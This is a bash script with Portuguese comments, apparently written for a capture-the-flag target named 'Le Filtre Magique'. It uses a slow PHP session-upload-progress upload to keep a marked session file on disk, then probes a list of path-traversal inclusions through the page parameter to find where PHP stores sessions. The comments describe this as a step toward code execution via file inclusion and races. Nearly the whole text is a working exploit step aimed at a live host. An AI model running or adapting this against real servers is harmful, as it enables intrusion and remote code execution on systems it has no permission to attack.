#!/usr/bin/env bash
# ---------------------------------------------------------------------------
# Le Filtre Magique — diagnostico: ONDE o PHP grava o sess_<SID>?
#
# Sem race: um upload LENTO (--limit-rate) mantem o POST aberto ~100s, entao o
# arquivo de sessao com a chave  upload_progress_<MARK>  fica no disco durante
# toda a varredura. Lemos cada candidato de save_path como TEXTO e procuramos o
# MARK -> separa "onde/existe?" de "system() executa?". SID escolhido pelo
# servidor (nao assume fixation) -> tambem testa se strict_mode rejeitava o SID.
# ---------------------------------------------------------------------------
set -u
H='https://filtre-magique.cyberzerk.fr'
MARK='UPMARK_7Z3Q'
TMP=$(mktemp -d); BIG="$TMP/big"; JAR="$TMP/jar"
head -c 6000000 /dev/zero | tr '\0' 'A' > "$BIG"

# 1) sessao com SID escolhido pelo servidor
curl -s -o /dev/null -c "$JAR" "$H/"
SID=$(awk 'tolower($0) ~ /phpsessid/{print $NF}' "$JAR")
echo "[*] SID (servidor) = $SID   -> procurando sess_$SID"
[ -z "$SID" ] && { echo "[-] servidor nao setou PHPSESSID (app nao faz session_start?)"; rm -rf "$TMP"; exit 1; }

# 2) upload LENTO em background = janela longa sem race
( curl -s -o /dev/null -b "$JAR" --limit-rate 60k -m 140 "$H/" \
    --form-string "PHP_SESSION_UPLOAD_PROGRESS=$MARK" \
    -F "f=@$BIG;filename=x" ) &
UP=$!
echo "[*] upload lento no ar (pid $UP); aguardando o sess_ materializar..."
sleep 3

# 3) candidatos de save_path, relativos a base de include /app/pages/
PATHS=(
  "../sess_$SID"                          # /app
  "sess_$SID"                             # /app/pages (base)
  "../../tmp/sess_$SID"                   # /tmp
  "../../../tmp/sess_$SID"
  "../../var/tmp/sess_$SID"               # /var/tmp
  "../../dev/shm/sess_$SID"               # /dev/shm
  "../../var/lib/php/sessions/sess_$SID"  # Debian
  "../../var/lib/php7/sessions/sess_$SID"
  "../../var/lib/php8/sessions/sess_$SID"
  "../../run/php/sess_$SID"
  "../../tmp/sessions/sess_$SID"
  "../../sessions/sess_$SID"
  "../sessions/sess_$SID"                 # /app/sessions
  "../../sess_$SID"                       # / (raiz)
)

found=""
for t in $(seq 1 12); do
  for p in "${PATHS[@]}"; do
    out=$(curl -s -m 8 -b "$JAR" "$H/?page=$p")
    if printf %s "$out" | grep -qa "$MARK"; then
      echo; echo "[+] ACHOU o arquivo de sessao em: $p"
      echo "    chave: $(printf %s "$out" | grep -oa "upload_progress_$MARK" | head -1)"
      found="$p"; break 2
    fi
  done
  printf "\r[.] varredura passo %d/12 (janela do upload aberta)..." "$t"
  sleep 1
done
echo

if [ -n "$found" ]; then
  echo "[OK] save_path localizado. Relativo a /app/pages/:  $found"
  echo "     -> proxima fase: race so nesse path, com readers em paralelo."
else
  echo "[--] sess_$SID NAO apareceu em nenhum candidato. Leituras:"
  echo "     a) upload_progress desabilitado;  b) save_path exotico;"
  echo "     c) strict_mode rejeita / nome diferente. Partimos p/ temp-file race."
fi

kill "$UP" 2>/dev/null; wait 2>/dev/null; rm -rf "$TMP"
